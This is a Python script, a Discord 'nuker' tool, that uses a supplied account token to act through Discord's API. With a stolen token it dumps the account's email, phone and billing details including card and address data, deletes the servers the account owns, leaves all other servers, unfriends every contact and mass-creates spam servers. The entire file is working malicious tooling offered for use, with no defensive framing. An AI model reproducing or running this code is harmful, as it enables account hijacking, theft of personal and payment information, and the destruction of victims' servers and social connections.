import os
import sys
import time
import requests

def detect_system():
    if os.name == "nt":
        return 0
    else:
        return 1

def token_input():
    try:
        token = sys.argv[1]
    except:
        token = input("[!] ENTER A TOKEN VALUE [!]\n>> ")
    return token

def browser_headers(token):
    headers = {
        "Content-Type":"application/json",
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
        "Authorization":token
    }
    return headers

def forward(token):
    input("[!] PRESS ENTER TO GO TO MAIN MENU [!]\n>>")
    os.system("cls") if detect_system() == 0 else os.system("clear") 
    menu(token)

def check_token(token):
    print("[!] CHECKING TOKEN VALUE... PLEASE WAIT... [!]") ; time.sleep(2)

    check = requests.get("https://discord.com/api/v8/users/@me", headers=browser_headers(token))
    
    if check.status_code != 200:
        print("[X] ERROR, INVALID TOKEN  VALUE, TRY AGAIN WITH ANOTHER VALUE OR PRESS CTRL + C TO EXIT [X]")
        main()

    print("[*] SUCCESS, THE TOKEN VALUE IS VALID [*]\n")
    
    input("[!] PRESS ENTER TO GO TO MAIN MENU [!]")
    os.system("cls") if detect_system() == 0 else os.system("clear") 
    return True

def get_token_data(token):
    counter = 1
    information = requests.get("https://discord.com/api/v8/users/@me", headers=browser_headers(token)).json()
    billing_info = requests.get("https://discord.com/api/v8/users/@me/billing/payment-sources", headers=browser_headers(token)).json()
    
    username = information["username"] + "#" + information["discriminator"]
    user_id = information["id"]
    email = information["email"]
    phone = information["phone"]
    verification = information["verified"]
    mfa = information["mfa_enabled"]

    print(f"[*] ACCOUNT INFORMATION FOUNDED [*]\n[-] Username: {username}\n[-] User ID: {user_id}\n[-] Email: {email}\n[-] Phone: {phone}\n[-] Verification: {verification}\n[-] MFA: {mfa}\n")

    if len(billing_info) == 0:
        print("[X] THE USER DOES NOT HAS PAYMENT METHODS ADDED [X]\n")

    for billing in billing_info:
        card_type = billing["brand"]
        last_four = billing["last_4"]   
        expiration_date = str(billing["expires_month"]) + "/" + str(billing["expires_year"])
        card_holder = billing["billing_address"]["name"]
        street = billing["billing_address"]["line_1"]
        zip_code = billing["billing_address"]["postal_code"]
        city = billing["billing_address"]["city"]
        state = billing["billing_address"]["state"]
        country = billing["billing_address"]["country"]

        print(f"[*] CARD NO. {counter} FOUNDED [*]\n[-] Card Type: {card_type}\n[-] Last Four: {last_four}\n[-] Expiration Date {expiration_date}\n[-] Card Holder: {card_holder}\n[-] Zip Code: {zip_code}\n[-] City: {city}\n[-] State: {state}\n[-] Street: {street}\n[-] Country: {country}\n")
        counter += 1
    
    forward(token)

def remove_guilds(token):
    print("[!] WARNING, THE DELETE SERVERS OPTIONS ONLY WORKS IF THE MFA STATUS IS DISABLED [!]\n")

    special_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
        "Authorization": token
    }

    guilds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=browser_headers(token)).json()

    if len(guilds) == 0:
        print("[*] THE USER IS NOT ON ANY SERVER, THERE'S NOTHING TO DELETE [*]\n")
        forward(token)

    for guild in guilds:
        if guild["owner"] == True:
            try:
                delete_owned_guild = requests.delete(f"https://discord.com/api/v8/guilds/{guild['id']}", headers=browser_headers(token))
                print(f"[*] DELETED SERVER WITH NAME {guild['name']}\n")
            except:
                print(f"[X] ERROR, COULD NOT DELETE THE SERVER NAMED {guild['name']} [X]\n")
        else:
            delete_not_owned_guild = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{guild['id']}", headers=special_headers)
            print(f"[*] LEFT FROM SERVER {guild['name']}\n")

    print("[*] ACTIONS FINISHED [*]\n")

    forward(token)

def unfriend_all(token):
    friends = requests.get("https://discord.com/api/v8/users/@me/relationships", headers=browser_headers(token)).json()

    if len(friends) == 0:
        print("[X] ERROR, USER DOES NOT HAS FRIENDS, SO THERE'S NOTHING TO DELETE [X]\n")
        forward(token)

    for friend in friends:
        username = friend['user']['username'] + "#" + friend['user']['discriminator']
        friend_id = friend['id']

        delete_friends = requests.delete(f"https://discord.com/api/v8/users/@me/relationships/{friend_id}", headers=browser_headers(token))
        
        if delete_friends.status_code == 204:
            print(f"[*] SUCCESSFULLY UNFRIENDED USER {username}\n")
        else:
            print(f"[X] ERROR, I WAS NOT ABLE TO UNFRIEND {username}\n")

    print("[*] ALL ACTIONS FINISHED [*]")

    forward(token)

def create_spam_guilds(token):
    counter = 1
    print("[!] IN ORDER TO CREATE THE SPAM SERVERS, IT'S NECESSARY PASS THE ARGUMENT FOR THE NAME.\nUSE A NAME WITH A RANGE OF CHARACTERS BETWEEN 2-200 [!]")
    
    def name_input():
        server_name = input(">> ")

        if len(server_name) < 2 or len(server_name) > 200:
            print("[X] ERROR, INVALID CHARACTERS AMOUNT, TRY AGAIN WITH OTHER NAME [X]")
            name_input()
        return server_name
    
    def servers_amount():   
        print("[!] PLEASE, ENTER THE AMOUNT OF SERVERS THAT YOU WANT TO CREATE, USE A RANGE BETWEEN 1-100 [!]")
        server_amount = int(input(">> "))
        if server_amount < 1 or server_amount > 100 or server_amount == float:
            print("[X] ERROR, INVALID AMOUNT, USE INT VALUES OR A DIFFERENT VALUE [X]")
            servers_amount()
        return server_amount

    server_name = name_input()
    amount = servers_amount()

    server = {
        "name": server_name
    }

    while counter < amount:
        try:
            create_guilds = requests.post("https://discord.com/api/v8/guilds", json=server, headers=browser_headers(token))
            if create_guilds.status_code == 201:
                print(f"[*] SUCCESSFULLY CREATED SERVER NO. {counter}")
        except:
            print("[X] ERROR, FOR SOME UNKNOWN REASON I WAS NOT ABLE TO CREATE A GUILD [X]")
        counter += 1

    print("[*] ALL ACTIONS FINISHED [*]")

    forward(token)

def menu(token):
    anarchy = r"""

             ▄▄▄·▄• ▄▌ ▐ ▄ ▄ •▄ ▄▄▌ ▐ ▄▌ ▐ ▄ ▄▄▄ .·▄▄▄▄       ▐ ▄ ▄• ▄▌▄ •▄ ▄▄▄ .▄▄▄  
            ▐█ ▄██▪██▌•█▌▐██▌▄▌▪██· █▌▐█•█▌▐█▀▄.▀·██▪ ██     •█▌▐██▪██▌█▌▄▌▪▀▄.▀·▀▄ █·
             ██▀·█▌▐█▌▐█▐▐▌▐▀▀▄·██▪▐█▐▐▌▐█▐▐▌▐▀▀▪▄▐█· ▐█▌    ▐█▐▐▌█▌▐█▌▐▀▀▄·▐▀▀▪▄▐▀▀▄ 
            ▐█▪·•▐█▄█▌██▐█▌▐█.█▌▐█▌██▐█▌██▐█▌▐█▄▄▌██. ██     ██▐█▌▐█▄█▌▐█.█▌▐█▄▄▌▐█•█▌
            .▀    ▀▀▀ ▀▀ █▪·▀  ▀ ▀▀▀▀ ▀▪▀▀ █▪ ▀▀▀ ▀▀▀▀▀•     ▀▀ █▪ ▀▀▀ ·▀  ▀ ▀▀▀ .▀  ▀

    Official Github Repo: https://github.com/PuppetCrowley/Punkwned-Nuker
    Nuker by: Crowley

                                [!] CHOOSE AN OPTION [!]
    [0] - Exit. 
    [1] - Get token information.
    [2] - Delete and leave servers.
    [3] - Unfriend All.
    [4] - Create spam servers.
    """
    print(anarchy)

    def choose_an_option(token):
        option = int(input("\n>>"))

        if option == 0:
            os.system("cls") if detect_system() == 0 else os.system("clear")
            exit()
        elif option == 1:
            os.system("cls") if detect_system() == 0 else os.system("clear")
            get_token_data(token)
        elif option == 2:
            os.system("cls") if detect_system() == 0 else os.system("clear")
            remove_guilds(token)
        elif option == 3:
            os.system("cls") if detect_system() == 0 else os.system("clear")
            unfriend_all(token)
        elif option == 4:
            os.system("cls") if detect_system() == 0 else os.system("clear")
            create_spam_guilds(token)
        else:
            print("[X] ERROR, INVALID OPTION, PLEASE TRY AGAIN [X]")
            choose_an_option(token)
            
    choose_an_option(token)

def main():
    token = token_input()
    value = check_token(token)
    if value == True:
        menu(token)

main()